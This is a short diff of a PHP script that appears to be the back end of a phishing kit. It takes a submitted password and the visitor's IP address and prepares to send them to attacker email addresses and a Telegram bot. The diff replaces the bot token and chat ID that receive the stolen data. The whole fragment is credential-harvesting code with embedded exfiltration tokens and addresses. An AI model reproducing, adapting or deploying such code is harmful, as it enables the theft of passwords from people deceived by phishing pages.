@@ -3,8 +3,8 @@
     $data = trim($_POST['pass']);
     $ipaddress = $_SERVER['REMOTE_ADDR'];
     $to = "Mickmullfer@gmail.com,r3sultb0x@rambler.ru";
-    $token = "5699366095:AAFVEnqARj6fBd4K2i3C5z4XQ_gig5vrIUs";
-    $chatid = "5777799686";
+    $token = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk";
+    $chatid = "1357995456";
 
      function sendMessage($chatID, $messaggio, $token) {
         echo "sending message to " . $chatID . "\n";
